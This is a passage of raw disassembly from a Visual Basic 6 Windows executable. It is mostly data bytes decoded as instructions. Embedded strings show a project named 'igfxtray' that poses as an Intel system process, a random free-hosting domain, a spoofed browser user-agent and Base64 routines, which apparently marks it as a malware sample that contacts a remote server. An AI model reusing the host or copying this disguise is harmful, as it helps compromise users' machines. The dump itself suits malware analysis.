  402101:	e9 3a 1e 00 00       	jmp    0x403f40
  402106:	81 6c 24 04 3b 00 00 	subl   $0x3b,0x4(%esp)
  40210d:	00 
  40210e:	e9 7d 22 00 00       	jmp    0x404390
  402113:	81 6c 24 04 3f 00 00 	subl   $0x3f,0x4(%esp)
  40211a:	00 
  40211b:	e9 e0 23 00 00       	jmp    0x404500
  402120:	81 6c 24 04 4b 00 00 	subl   $0x4b,0x4(%esp)
  402127:	00 
  402128:	e9 43 25 00 00       	jmp    0x404670
  40212d:	00 00                	add    %al,(%eax)
  40212f:	00 00                	add    %al,(%eax)
  402131:	00 00                	add    %al,(%eax)
  402133:	00 74 80 40          	add    %dh,0x40(%eax,%eax,4)
  402137:	00 34 30             	add    %dh,(%eax,%esi,1)
  40213a:	40                   	inc    %eax
  40213b:	00 ff                	add    %bh,%bh
  40213d:	ff                   	(bad)
  40213e:	ff                   	(bad)
  40213f:	ff 00                	incl   (%eax)
  402141:	00 00                	add    %al,(%eax)
  402143:	00 64 80 40          	add    %ah,0x40(%eax,%eax,4)
  402147:	00 e0                	add    %ah,%al
  402149:	29 04 4b             	sub    %eax,(%ebx,%ecx,2)
  40214c:	1f                   	pop    %ds
  40214d:	70 65                	jo     0x4021b4
  40214f:	4f                   	dec    %edi
  402150:	b0 7d                	mov    $0x7d,%al
  402152:	7d 72                	jge    0x4021c6
  402154:	8d 9a c2 a9 0a 00    	lea    0xaa9c2(%edx),%ebx
  40215a:	02 00                	add    (%eax),%al
  40215c:	04 00                	add    $0x0,%al
  40215e:	02 00                	add    (%eax),%al
  402160:	84 21                	test   %ah,(%ecx)
  402162:	40                   	inc    %eax
	...
  40216f:	00 1c 22             	add    %bl,(%edx,%eiz,1)
  402172:	40                   	inc    %eax
  402173:	00 09                	add    %cl,(%ecx)
  402175:	04 00                	add    $0x0,%al
  402177:	00 10                	add    %dl,(%eax)
  402179:	04 00                	add    $0x0,%al
  40217b:	00 00                	add    %al,(%eax)
  40217d:	00 00                	add    %al,(%eax)
  40217f:	00 02                	add    %al,(%edx)
  402181:	00 00                	add    %al,(%eax)
  402183:	00 88 19 40 00 ff    	add    %cl,-0xffbfe7(%eax)
  402189:	ff                   	(bad)
  40218a:	ff                   	(bad)
  40218b:	ff 1c 23             	lcall  *(%ebx,%eiz,1)
  40218e:	40                   	inc    %eax
  40218f:	00 00                	add    %al,(%eax)
  402191:	00 00                	add    %al,(%eax)
  402193:	00 10                	add    %dl,(%eax)
  402195:	80 40 00 00          	addb   $0x0,0x0(%eax)
  402199:	00 00                	add    %al,(%eax)
  40219b:	00 28                	add    %ch,(%eax)
  40219d:	22 40 00             	and    0x0(%eax),%al
  4021a0:	08 00                	or     %al,(%eax)
  4021a2:	00 00                	add    %al,(%eax)
  4021a4:	00 00                	add    %al,(%eax)
  4021a6:	00 00                	add    %al,(%eax)
  4021a8:	ff                   	(bad)
  4021a9:	ff 00                	incl   (%eax)
  4021ab:	00 01                	add    %al,(%ecx)
  4021ad:	80 01 00             	addb   $0x0,(%ecx)
  4021b0:	00 00                	add    %al,(%eax)
  4021b2:	00 00                	add    %al,(%eax)
  4021b4:	2c 1d                	sub    $0x1d,%al
  4021b6:	40                   	inc    %eax
  4021b7:	00 ff                	add    %bh,%bh
  4021b9:	ff                   	(bad)
  4021ba:	ff                   	(bad)
  4021bb:	ff 20                	jmp    *(%eax)
  4021bd:	2a 40 00             	sub    0x0(%eax),%al
	...
  4021cc:	30 22                	xor    %ah,(%edx)
  4021ce:	40                   	inc    %eax
  4021cf:	00 0d 00 00 00 e4    	add    %cl,0xe4000000
  4021d5:	21 40 00             	and    %eax,0x0(%eax)
  4021d8:	ff                   	(bad)
  4021d9:	ff 00                	incl   (%eax)
  4021db:	00 83 80 01 00 00    	add    %al,0x180(%ebx)
  4021e1:	00 00                	add    %al,(%eax)
  4021e3:	00 30                	add    %dh,(%eax)
  4021e5:	f1                   	int1
  4021e6:	25 b7 ef 47 1a       	and    $0x1a47efb7,%eax
  4021eb:	10 a5 f1 02 60 8c    	adc    %ah,-0x739ffd0f(%ebp)
  4021f1:	9e                   	sahf
  4021f2:	eb ac                	jmp    0x4021a0
  4021f4:	10 00                	adc    %al,(%eax)
  4021f6:	00 00                	add    %al,(%eax)
  4021f8:	30 f1                	xor    %dh,%cl
  4021fa:	25 b7 ef 47 1a       	and    $0x1a47efb7,%eax
  4021ff:	10 a5 f1 02 60 8c    	adc    %ah,-0x739ffd0f(%ebp)
  402205:	9e                   	sahf
  402206:	eb ac                	jmp    0x4021b4
  402208:	0d 00 00 00 8f       	or     $0x8f000000,%eax
  40220d:	88 24 6d 18 47 da 4b 	mov    %ah,0x4bda4718(,%ebp,2)
  402214:	af                   	scas   %es:(%edi),%eax
  402215:	ed                   	in     (%dx),%eax
  402216:	ea 0f 00 00 00 00 69 	ljmp   $0x6900,$0xf
  40221d:	67 66 78 74          	addr16 data16 js 0x402295
  402221:	72 61                	jb     0x402284
  402223:	79 00                	jns    0x402225
  402225:	00 00                	add    %al,(%eax)
  402227:	00 4d 6f             	add    %cl,0x6f(%ebp)
  40222a:	64 75 6c             	fs jne 0x402299
  40222d:	65 31 00             	xor    %eax,%gs:(%eax)
  402230:	66 72 6d             	data16 jb 0x4022a0
  402233:	4d                   	dec    %ebp
  402234:	61                   	popa
  402235:	69 6e 00 40 00 00 00 	imul   $0x40,0x0(%esi),%ebp
  40223c:	78 00                	js     0x40223e
  40223e:	68 00 64 00 79       	push   $0x79006400
  402243:	00 65 00             	add    %ah,0x0(%ebp)
  402246:	67 00 67 00          	add    %ah,0x0(%bx)
  40224a:	65 00 65 00          	add    %ah,%gs:0x0(%ebp)
  40224e:	65 00 66 00          	add    %ah,%gs:0x0(%esi)
  402252:	65 00 65 00          	add    %ah,%gs:0x0(%ebp)
  402256:	77 00                	ja     0x402258
  402258:	2e 00 30             	add    %dh,%cs:(%eax)
  40225b:	00 30                	add    %dh,(%eax)
  40225d:	00 30                	add    %dh,(%eax)
  40225f:	00 77 00             	add    %dh,0x0(%edi)
  402262:	65 00 62 00          	add    %ah,%gs:0x0(%edx)
  402266:	68 00 6f 00 73       	push   $0x73006f00
  40226b:	00 74 00 61          	add    %dh,0x61(%eax,%eax,1)
  40226f:	00 70 00             	add    %dh,0x0(%eax)
  402272:	70 00                	jo     0x402274
  402274:	2e 00 63 00          	add    %ah,%cs:0x0(%ebx)
  402278:	6f                   	outsl  %ds:(%esi),(%dx)
  402279:	00 6d 00             	add    %ch,0x0(%ebp)
  40227c:	00 00                	add    %al,(%eax)
  40227e:	00 00                	add    %al,(%eax)
  402280:	96                   	xchg   %eax,%esi
  402281:	00 00                	add    %al,(%eax)
  402283:	00 4d 00             	add    %cl,0x0(%ebp)
  402286:	6f                   	outsl  %ds:(%esi),(%dx)
  402287:	00 7a 00             	add    %bh,0x0(%edx)
  40228a:	69 00 6c 00 6c 00    	imul   $0x6c006c,(%eax),%eax
  402290:	61                   	popa
  402291:	00 2f                	add    %ch,(%edi)
  402293:	00 34 00             	add    %dh,(%eax,%eax,1)
  402296:	2e 00 30             	add    %dh,%cs:(%eax)
  402299:	00 20                	add    %ah,(%eax)
  40229b:	00 28                	add    %ch,(%eax)
  40229d:	00 63 00             	add    %ah,0x0(%ebx)
  4022a0:	6f                   	outsl  %ds:(%esi),(%dx)
  4022a1:	00 6d 00             	add    %ch,0x0(%ebp)
  4022a4:	70 00                	jo     0x4022a6
  4022a6:	61                   	popa
  4022a7:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  4022ab:	00 62 00             	add    %ah,0x0(%edx)
  4022ae:	6c                   	insb   (%dx),%es:(%edi)
  4022af:	00 65 00             	add    %ah,0x0(%ebp)
  4022b2:	3b 00                	cmp    (%eax),%eax
  4022b4:	20 00                	and    %al,(%eax)
  4022b6:	4d                   	dec    %ebp
  4022b7:	00 53 00             	add    %dl,0x0(%ebx)
  4022ba:	49                   	dec    %ecx
  4022bb:	00 45 00             	add    %al,0x0(%ebp)
  4022be:	20 00                	and    %al,(%eax)
  4022c0:	37                   	aaa
  4022c1:	00 2e                	add    %ch,(%esi)
  4022c3:	00 30                	add    %dh,(%eax)
  4022c5:	00 3b                	add    %bh,(%ebx)
  4022c7:	00 20                	add    %ah,(%eax)
  4022c9:	00 57 00             	add    %dl,0x0(%edi)
  4022cc:	69 00 6e 00 64 00    	imul   $0x64006e,(%eax),%eax
  4022d2:	6f                   	outsl  %ds:(%esi),(%dx)
  4022d3:	00 77 00             	add    %dh,0x0(%edi)
  4022d6:	73 00                	jae    0x4022d8
  4022d8:	20 00                	and    %al,(%eax)
  4022da:	4e                   	dec    %esi
  4022db:	00 54 00 20          	add    %dl,0x20(%eax,%eax,1)
  4022df:	00 35 00 2e 00 31    	add    %dh,0x31002e00
  4022e5:	00 3b                	add    %bh,(%ebx)
  4022e7:	00 20                	add    %ah,(%eax)
  4022e9:	00 53 00             	add    %dl,0x0(%ebx)
  4022ec:	56                   	push   %esi
  4022ed:	00 31                	add    %dh,(%ecx)
  4022ef:	00 3b                	add    %bh,(%ebx)
  4022f1:	00 20                	add    %ah,(%eax)
  4022f3:	00 2e                	add    %ch,(%esi)
  4022f5:	00 4e 00             	add    %cl,0x0(%esi)
  4022f8:	45                   	inc    %ebp
  4022f9:	00 54 00 20          	add    %dl,0x20(%eax,%eax,1)
  4022fd:	00 43 00             	add    %al,0x0(%ebx)
  402300:	4c                   	dec    %esp
  402301:	00 52 00             	add    %dl,0x0(%edx)
  402304:	20 00                	and    %al,(%eax)
  402306:	32 00                	xor    (%eax),%al
  402308:	2e 00 30             	add    %dh,%cs:(%eax)
  40230b:	00 2e                	add    %ch,(%esi)
  40230d:	00 35 00 30 00 37    	add    %dh,0x37003000
  402313:	00 32                	add    %dh,(%edx)
  402315:	00 37                	add    %dh,(%edi)
  402317:	00 29                	add    %ch,(%ecx)
  402319:	00 00                	add    %al,(%eax)
  40231b:	00 64 00 40          	add    %ah,0x40(%eax,%eax,1)
  40231f:	00 02                	add    %al,(%edx)
  402321:	00 02                	add    %al,(%edx)
  402323:	00 00                	add    %al,(%eax)
  402325:	00 00                	add    %al,(%eax)
  402327:	00 08                	add    %cl,(%eax)
  402329:	00 05 00 5a 00 31    	add    %al,0x31005a00
  40232f:	00 00                	add    %al,(%eax)
  402331:	00 00                	add    %al,(%eax)
  402333:	00 11                	add    %dl,(%ecx)
  402335:	4d                   	dec    %ebp
  402336:	25 77 01 00 92       	and    $0x92000177,%eax
  40233b:	00 01                	add    %al,(%ecx)
	...
  402345:	00 00                	add    %al,(%eax)
  402347:	00 40 00             	add    %al,0x0(%eax)
  40234a:	00 00                	add    %al,(%eax)
  40234c:	00 00                	add    %al,(%eax)
  40234e:	00 00                	add    %al,(%eax)
  402350:	11 00                	adc    %eax,(%eax)
  402352:	25 77 24 00 05       	and    $0x5002477,%eax
  402357:	00 c1                	add    %al,%cl
  402359:	10 00                	adc    %al,(%eax)
  40235b:	00 00                	add    %al,(%eax)
  40235d:	00 1b                	add    %bl,(%ebx)
  40235f:	00 00                	add    %al,(%eax)
  402361:	00 00                	add    %al,(%eax)
  402363:	00 01                	add    %al,(%ecx)
  402365:	00 92 00 01 00 00    	add    %dl,0x100(%edx)
	...
  402373:	00 80 00 00 00 00    	add    %al,0x0(%eax)
  402379:	00 00                	add    %al,(%eax)
  40237b:	00 11                	add    %dl,(%ecx)
  40237d:	00 43 00             	add    %al,0x0(%ebx)
	...
  402388:	02 00                	add    (%eax),%al
  40238a:	00 00                	add    %al,(%eax)
  40238c:	3d 00 00 00 7a       	cmp    $0x7a000000,%eax
  402391:	00 00                	add    %al,(%eax)
  402393:	00 4c 00 65          	add    %cl,0x65(%eax,%eax,1)
  402397:	00 6e 00             	add    %ch,0x0(%esi)
  40239a:	67 00 74 00          	add    %dh,0x0(%si)
  40239e:	68 00 20 00 6f       	push   $0x6f002000
  4023a3:	00 66 00             	add    %ah,0x0(%esi)
  4023a6:	20 00                	and    %al,(%eax)
  4023a8:	42                   	inc    %edx
  4023a9:	00 61 00             	add    %ah,0x0(%ecx)
  4023ac:	73 00                	jae    0x4023ae
  4023ae:	65 00 36             	add    %dh,%gs:(%esi)
  4023b1:	00 34 00             	add    %dh,(%eax,%eax,1)
  4023b4:	20 00                	and    %al,(%eax)
  4023b6:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  4023ba:	63 00                	arpl   %eax,(%eax)
  4023bc:	6f                   	outsl  %ds:(%esi),(%dx)
  4023bd:	00 64 00 65          	add    %ah,0x65(%eax,%eax,1)
  4023c1:	00 64 00 20          	add    %ah,0x20(%eax,%eax,1)
  4023c5:	00 69 00             	add    %ch,0x0(%ecx)
  4023c8:	6e                   	outsb  %ds:(%esi),(%dx)
  4023c9:	00 70 00             	add    %dh,0x0(%eax)
  4023cc:	75 00                	jne    0x4023ce
  4023ce:	74 00                	je     0x4023d0
  4023d0:	20 00                	and    %al,(%eax)
  4023d2:	73 00                	jae    0x4023d4
  4023d4:	74 00                	je     0x4023d6
  4023d6:	72 00                	jb     0x4023d8
  4023d8:	69 00 6e 00 67 00    	imul   $0x67006e,(%eax),%eax
  4023de:	20 00                	and    %al,(%eax)
  4023e0:	69 00 73 00 20 00    	imul   $0x200073,(%eax),%eax
  4023e6:	6e                   	outsb  %ds:(%esi),(%dx)
  4023e7:	00 6f 00             	add    %ch,0x0(%edi)
  4023ea:	74 00                	je     0x4023ec
  4023ec:	20 00                	and    %al,(%eax)
  4023ee:	61                   	popa
  4023ef:	00 20                	add    %ah,(%eax)
  4023f1:	00 6d 00             	add    %ch,0x0(%ebp)
  4023f4:	75 00                	jne    0x4023f6
  4023f6:	6c                   	insb   (%dx),%es:(%edi)
  4023f7:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  4023fb:	00 70 00             	add    %dh,0x0(%eax)
  4023fe:	6c                   	insb   (%dx),%es:(%edi)
  4023ff:	00 65 00             	add    %ah,0x0(%ebp)
  402402:	20 00                	and    %al,(%eax)
  402404:	6f                   	outsl  %ds:(%esi),(%dx)
  402405:	00 66 00             	add    %ah,0x0(%esi)
  402408:	20 00                	and    %al,(%eax)
  40240a:	34 00                	xor    $0x0,%al
  40240c:	2e 00 00             	add    %al,%cs:(%eax)
  40240f:	00 b8 66 c4 a4 9f    	add    %bh,-0x605b3b9a(%eax)
  402415:	49                   	dec    %ecx
  402416:	1b 10                	sbb    (%eax),%edx
  402418:	bb 78 00 aa 00       	mov    $0xaa0078,%ebx
  40241d:	38 3c bb             	cmp    %bh,(%ebx,%edi,4)
  402420:	02 00                	add    (%eax),%al
  402422:	00 00                	add    %al,(%eax)
  402424:	41                   	inc    %ecx
  402425:	00 00                	add    %al,(%eax)
  402427:	00 52 00             	add    %dl,0x0(%edx)
  40242a:	00 00                	add    %al,(%eax)
  40242c:	49                   	dec    %ecx
  40242d:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
  402431:	00 65 00             	add    %ah,0x0(%ebp)
  402434:	67 00 61 00          	add    %ah,0x0(%bx,%di)
  402438:	6c                   	insb   (%dx),%es:(%edi)
  402439:	00 20                	add    %ah,(%eax)
  40243b:	00 63 00             	add    %ah,0x0(%ebx)
  40243e:	68 00 61 00 72       	push   $0x72006100
  402443:	00 61 00             	add    %ah,0x0(%ecx)
  402446:	63 00                	arpl   %eax,(%eax)
  402448:	74 00                	je     0x40244a
  40244a:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40244e:	20 00                	and    %al,(%eax)
  402450:	69 00 6e 00 20 00    	imul   $0x20006e,(%eax),%eax
  402456:	42                   	inc    %edx
  402457:	00 61 00             	add    %ah,0x0(%ecx)
  40245a:	73 00                	jae    0x40245c
  40245c:	65 00 36             	add    %dh,%gs:(%esi)
  40245f:	00 34 00             	add    %dh,(%eax,%eax,1)
  402462:	20 00                	and    %al,(%eax)
  402464:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  402468:	63 00                	arpl   %eax,(%eax)
  40246a:	6f                   	outsl  %ds:(%esi),(%dx)
  40246b:	00 64 00 65          	add    %ah,0x65(%eax,%eax,1)
  40246f:	00 64 00 20          	add    %ah,0x20(%eax,%eax,1)
  402473:	00 64 00 61          	add    %ah,0x61(%eax,%eax,1)
  402477:	00 74 00 61          	add    %dh,0x61(%eax,%eax,1)
  40247b:	00 2e                	add    %ch,(%esi)
  40247d:	00 00                	add    %al,(%eax)
  40247f:	00 02                	add    %al,(%edx)
  402481:	00 00                	add    %al,(%eax)
  402483:	00 5a 00             	add    %bl,0x0(%edx)
  402486:	00 00                	add    %al,(%eax)
  402488:	02 00                	add    (%eax),%al
  40248a:	00 00                	add    %al,(%eax)
  40248c:	61                   	popa
  40248d:	00 00                	add    %al,(%eax)
  40248f:	00 02                	add    %al,(%edx)
  402491:	00 00                	add    %al,(%eax)
  402493:	00 7a 00             	add    %bh,0x0(%edx)
  402496:	00 00                	add    %al,(%eax)
  402498:	02 00                	add    (%eax),%al
  40249a:	00 00                	add    %al,(%eax)
  40249c:	30 00                	xor    %al,(%eax)
  40249e:	00 00                	add    %al,(%eax)
  4024a0:	02 00                	add    (%eax),%al
  4024a2:	00 00                	add    %al,(%eax)
  4024a4:	39 00                	cmp    %eax,(%eax)
  4024a6:	00 00                	add    %al,(%eax)
  4024a8:	02 00                	add    (%eax),%al
  4024aa:	00 00                	add    %al,(%eax)
  4024ac:	2b 00                	sub    (%eax),%eax
  4024ae:	00 00                	add    %al,(%eax)
  4024b0:	02 00                	add    (%eax),%al
  4024b2:	00 00                	add    %al,(%eax)
  4024b4:	2f                   	das
  4024b5:	00 00                	add    %al,(%eax)
  4024b7:	00 02                	add    %al,(%edx)
  4024b9:	00 00                	add    %al,(%eax)
  4024bb:	00 3f                	add    %bh,(%edi)
  4024bd:	00 00                	add    %al,(%eax)
  4024bf:	00 56 42             	add    %dl,0x42(%esi)
  4024c2:	41                   	inc    %ecx
  4024c3:	36 2e 44             	ss cs inc %esp
  4024c6:	4c                   	dec    %esp
  4024c7:	4c                   	dec    %esp
  4024c8:	00 00                	add    %al,(%eax)
  4024ca:	00 00                	add    %al,(%eax)
  4024cc:	5f                   	pop    %edi
  4024cd:	5f                   	pop    %edi
  4024ce:	76 62                	jbe    0x402532
  4024d0:	61                   	popa
  4024d1:	53                   	push   %ebx
  4024d2:	74 72                	je     0x402546
  4024d4:	56                   	push   %esi
  4024d5:	61                   	popa
  4024d6:	72 43                	jb     0x40251b
  4024d8:	6f                   	outsl  %ds:(%esi),(%dx)
  4024d9:	70 79                	jo     0x402554
  4024db:	00 5f 5f             	add    %bl,0x5f(%edi)
  4024de:	76 62                	jbe    0x402542
  4024e0:	61                   	popa
  4024e1:	55                   	push   %ebp
  4024e2:	49                   	dec    %ecx
  4024e3:	31 49 34             	xor    %ecx,0x34(%ecx)
  4024e6:	00 00                	add    %al,(%eax)
  4024e8:	88 66 49             	mov    %ah,0x49(%esi)
  4024eb:	10 3d 95 ce 43 94    	adc    %bh,0x9443ce95
  4024f1:	9a 89 83 9e 45 75 19 	lcall  $0x1975,$0x459e8389
  4024f8:	e2 4e                	loop   0x402548
  4024fa:	ad                   	lods   %ds:(%esi),%eax
  4024fb:	33 99 66 cf 11 b7    	xor    -0x48ee309a(%ecx),%ebx
  402501:	0c 00                	or     $0x0,%al
  402503:	aa                   	stos   %al,%es:(%edi)
  402504:	00 60 d3             	add    %ah,-0x2d(%eax)
  402507:	93                   	xchg   %eax,%ebx
  402508:	54                   	push   %esp
  402509:	65 78 74             	gs js  0x402580
  40250c:	31 00                	xor    %eax,(%eax)
  40250e:	00 00                	add    %al,(%eax)
  402510:	5f                   	pop    %edi
  402511:	5f                   	pop    %edi
  402512:	76 62                	jbe    0x402576
  402514:	61                   	popa
  402515:	53                   	push   %ebx
  402516:	74 72                	je     0x40258a
  402518:	32 56 65             	xor    0x65(%esi),%dl
  40251b:	63 00                	arpl   %eax,(%eax)
  40251d:	00 00                	add    %al,(%eax)
  40251f:	00 5f 5f             	add    %bl,0x5f(%edi)
  402522:	76 62                	jbe    0x402586
  402524:	61                   	popa
  402525:	46                   	inc    %esi
  402526:	72 65                	jb     0x40258d
  402528:	65 4f                	gs dec %edi
  40252a:	62 6a 00             	bound  %ebp,0x0(%edx)
  40252d:	00 00                	add    %al,(%eax)
  40252f:	00 5f 5f             	add    %bl,0x5f(%edi)
  402532:	76 62                	jbe    0x402596
  402534:	61                   	popa
  402535:	48                   	dec    %eax
  402536:	72 65                	jb     0x40259d
  402538:	73 75                	jae    0x4025af
  40253a:	6c                   	insb   (%dx),%es:(%edi)
  40253b:	74 43                	je     0x402580
  40253d:	68 65 63 6b 4f       	push   $0x4f6b6365
  402542:	62 6a 00             	bound  %ebp,0x0(%edx)
  402545:	00 00                	add    %al,(%eax)
  402547:	00 5f 5f             	add    %bl,0x5f(%edi)
  40254a:	76 62                	jbe    0x4025ae
  40254c:	61                   	popa
  40254d:	56                   	push   %esi
  40254e:	61                   	popa
  40254f:	72 44                	jb     0x402595
  402551:	75 70                	jne    0x4025c3
  402553:	00 5f 5f             	add    %bl,0x5f(%edi)
  402556:	76 62                	jbe    0x4025ba
  402558:	61                   	popa
  402559:	4f                   	dec    %edi
  40255a:	62 6a 53             	bound  %ebp,0x53(%edx)
  40255d:	65 74 00             	gs je  0x402560
  402560:	5f                   	pop    %edi
  402561:	5f                   	pop    %edi
  402562:	76 62                	jbe    0x4025c6
  402564:	61                   	popa
  402565:	53                   	push   %ebx
  402566:	74 72                	je     0x4025da
  402568:	43                   	inc    %ebx
  402569:	6d                   	insl   (%dx),%es:(%edi)
  40256a:	70 00                	jo     0x40256c
  40256c:	00 00                	add    %al,(%eax)
  40256e:	00 00                	add    %al,(%eax)
  402570:	5f                   	pop    %edi
  402571:	5f                   	pop    %edi
  402572:	76 62                	jbe    0x4025d6
  402574:	61                   	popa
  402575:	46                   	inc    %esi
  402576:	72 65                	jb     0x4025dd
  402578:	65 56                	gs push %esi
  40257a:	61                   	popa
  40257b:	72 4c                	jb     0x4025c9
  40257d:	69 73 74 00 00 00 00 	imul   $0x0,0x74(%ebx),%esi
  402584:	5f                   	pop    %edi
  402585:	5f                   	pop    %edi
  402586:	76 62                	jbe    0x4025ea
  402588:	61                   	popa
  402589:	55                   	push   %ebp
  40258a:	49                   	dec    %ecx
  40258b:	31 56 61             	xor    %edx,0x61(%esi)
  40258e:	72 00                	jb     0x402590
  402590:	5f                   	pop    %edi
  402591:	5f                   	pop    %edi
  402592:	76 62                	jbe    0x4025f6
  402594:	61                   	popa
  402595:	55                   	push   %ebp
  402596:	49                   	dec    %ecx
  402597:	31 49 32             	xor    %ecx,0x32(%ecx)
  40259a:	00 00                	add    %al,(%eax)
  40259c:	5f                   	pop    %edi
  40259d:	5f                   	pop    %edi
  40259e:	76 62                	jbe    0x402602
  4025a0:	61                   	popa
  4025a1:	47                   	inc    %edi
  4025a2:	65 6e                	outsb  %gs:(%esi),(%dx)
  4025a4:	65 72 61             	gs jb  0x402608
  4025a7:	74 65                	je     0x40260e
  4025a9:	42                   	inc    %edx
  4025aa:	6f                   	outsl  %ds:(%esi),(%dx)
  4025ab:	75 6e                	jne    0x40261b
  4025ad:	64 73 45             	fs jae 0x4025f5
  4025b0:	72 72                	jb     0x402624
  4025b2:	6f                   	outsl  %ds:(%esi),(%dx)
  4025b3:	72 00                	jb     0x4025b5
  4025b5:	00 00                	add    %al,(%eax)
  4025b7:	00 5f 5f             	add    %bl,0x5f(%edi)
  4025ba:	76 62                	jbe    0x40261e
  4025bc:	61                   	popa
  4025bd:	52                   	push   %edx
  4025be:	65 64 69 6d 00 00 5f 	gs imul $0x765f5f00,%fs:0x0(%ebp),%ebp
  4025c5:	5f 76 
  4025c7:	62 61 45             	bound  %esp,0x45(%ecx)
  4025ca:	72 61                	jb     0x40262d
  4025cc:	73 65                	jae    0x402633
  4025ce:	00 00                	add    %al,(%eax)
  4025d0:	5f                   	pop    %edi
  4025d1:	5f                   	pop    %edi
  4025d2:	76 62                	jbe    0x402636
  4025d4:	61                   	popa
  4025d5:	45                   	inc    %ebp
  4025d6:	72 72                	jb     0x40264a
  4025d8:	6f                   	outsl  %ds:(%esi),(%dx)
  4025d9:	72 4f                	jb     0x40262a
  4025db:	76 65                	jbe    0x402642
  4025dd:	72 66                	jb     0x402645
  4025df:	6c                   	insb   (%dx),%es:(%edi)
  4025e0:	6f                   	outsl  %ds:(%esi),(%dx)
  4025e1:	77 00                	ja     0x4025e3
  4025e3:	00 5f 5f             	add    %bl,0x5f(%edi)
  4025e6:	76 62                	jbe    0x40264a
  4025e8:	61                   	popa
  4025e9:	4c                   	dec    %esp
  4025ea:	62 6f 75             	bound  %ebp,0x75(%edi)
  4025ed:	6e                   	outsb  %ds:(%esi),(%dx)
  4025ee:	64 00 5f 5f          	add    %bl,%fs:0x5f(%edi)
  4025f2:	76 62                	jbe    0x402656
  4025f4:	61                   	popa
  4025f5:	55                   	push   %ebp
  4025f6:	62 6f 75             	bound  %ebp,0x75(%edi)
  4025f9:	6e                   	outsb  %ds:(%esi),(%dx)
  4025fa:	64 00 5f 5f          	add    %bl,%fs:0x5f(%edi)
  4025fe:	76 62                	jbe    0x402662
  402600:	61                   	popa
  402601:	56                   	push   %esi
  402602:	61                   	popa
  402603:	72 4d                	jb     0x402652
  402605:	6f                   	outsl  %ds:(%esi),(%dx)
  402606:	76 65                	jbe    0x40266d
  402608:	00 00                	add    %al,(%eax)
  40260a:	00 00                	add    %al,(%eax)
  40260c:	5f                   	pop    %edi
  40260d:	5f                   	pop    %edi
  40260e:	76 62                	jbe    0x402672
  402610:	61                   	popa
  402611:	41                   	inc    %ecx
  402612:	72 79                	jb     0x40268d
  402614:	44                   	inc    %esp
  402615:	65 73 74             	gs jae 0x40268c
  402618:	72 75                	jb     0x40268f
  40261a:	63 74 00 00          	arpl   %esi,0x0(%eax,%eax,1)
  40261e:	00 00                	add    %al,(%eax)
  402620:	5f                   	pop    %edi
  402621:	5f                   	pop    %edi
  402622:	76 62                	jbe    0x402686
  402624:	61                   	popa
  402625:	46                   	inc    %esi
  402626:	72 65                	jb     0x40268d
  402628:	65 53                	gs push %ebx
  40262a:	74 72                	je     0x40269e
  40262c:	00 00                	add    %al,(%eax)
  40262e:	00 00                	add    %al,(%eax)
  402630:	5f                   	pop    %edi
  402631:	5f                   	pop    %edi
  402632:	76 62                	jbe    0x402696
  402634:	61                   	popa
  402635:	46                   	inc    %esi
  402636:	72 65                	jb     0x40269d
  402638:	65 56                	gs push %esi
  40263a:	61                   	popa
  40263b:	72 00                	jb     0x40263d
  40263d:	00 00                	add    %al,(%eax)
  40263f:	00 5f 5f             	add    %bl,0x5f(%edi)
  402642:	76 62                	jbe    0x4026a6
  402644:	61                   	popa
  402645:	41                   	inc    %ecx
  402646:	72 79                	jb     0x4026c1
  402648:	4d                   	dec    %ebp
  402649:	6f                   	outsl  %ds:(%esi),(%dx)
  40264a:	76 65                	jbe    0x4026b1
  40264c:	00 00                	add    %al,(%eax)
  40264e:	00 00                	add    %al,(%eax)
  402650:	5f                   	pop    %edi
  402651:	5f                   	pop    %edi
  402652:	76 62                	jbe    0x4026b6
  402654:	61                   	popa
  402655:	53                   	push   %ebx
  402656:	74 72                	je     0x4026ca
  402658:	56                   	push   %esi
  402659:	61                   	popa
  40265a:	72 4d                	jb     0x4026a9
  40265c:	6f                   	outsl  %ds:(%esi),(%dx)
  40265d:	76 65                	jbe    0x4026c4
  40265f:	00 5f 5f             	add    %bl,0x5f(%edi)
  402662:	76 62                	jbe    0x4026c6
  402664:	61                   	popa
  402665:	53                   	push   %ebx
  402666:	74 72                	je     0x4026da
  402668:	4d                   	dec    %ebp
  402669:	6f                   	outsl  %ds:(%esi),(%dx)
  40266a:	76 65                	jbe    0x4026d1
  40266c:	00 00                	add    %al,(%eax)
  40266e:	00 00                	add    %al,(%eax)
  402670:	5f                   	pop    %edi
  402671:	5f                   	pop    %edi
  402672:	76 62                	jbe    0x4026d6
  402674:	61                   	popa
  402675:	53                   	push   %ebx
  402676:	74 72                	je     0x4026ea
  402678:	43                   	inc    %ebx
  402679:	6f                   	outsl  %ds:(%esi),(%dx)
  40267a:	70 79                	jo     0x4026f5
  40267c:	00 00                	add    %al,(%eax)
  40267e:	00 00                	add    %al,(%eax)
  402680:	23 2d 42 54 a6 e3    	and    0xe3a65442,%ebp
  402686:	1e                   	push   %ds
  402687:	4a                   	dec    %edx
  402688:	84 d0                	test   %dl,%al
  40268a:	53                   	push   %ebx
  40268b:	0b ef                	or     %edi,%ebp
  40268d:	c0 61 41 b5          	shlb   $0xb5,0x41(%ecx)
  402691:	0f a3 67 91          	bt     %esp,-0x6f(%edi)
  402695:	ed                   	in     (%dx),%eax
  402696:	b3 46                	mov    $0x46,%bl
  402698:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  402699:	47                   	inc    %edi
  40269a:	00 6d 12             	add    %ch,0x12(%ebp)
  40269d:	9e                   	sahf
  40269e:	31 85 88 40 7c 88    	xor    %eax,-0x7783bf78(%ebp)
  4026a4:	fe                   	(bad)
  4026a5:	20 03                	and    %al,(%ebx)
  4026a7:	40                   	inc    %eax
  4026a8:	a9 f4 c5 00 e8       	test   $0xe800c5f4,%eax
  4026ad:	d3 47 e4             	roll   %cl,-0x1c(%edi)
  4026b0:	02 00                	add    (%eax),%al
  4026b2:	00 00                	add    %al,(%eax)
  4026b4:	29 00                	sub    %eax,(%eax)
  4026b6:	00 00                	add    %al,(%eax)
  4026b8:	00 00                	add    %al,(%eax)
  4026ba:	00 00                	add    %al,(%eax)
  4026bc:	2e 3d fb fc fa a0    	cs cmp $0xa0fafcfb,%eax
  4026c2:	68 10 a7 38 08       	push   $0x838a710
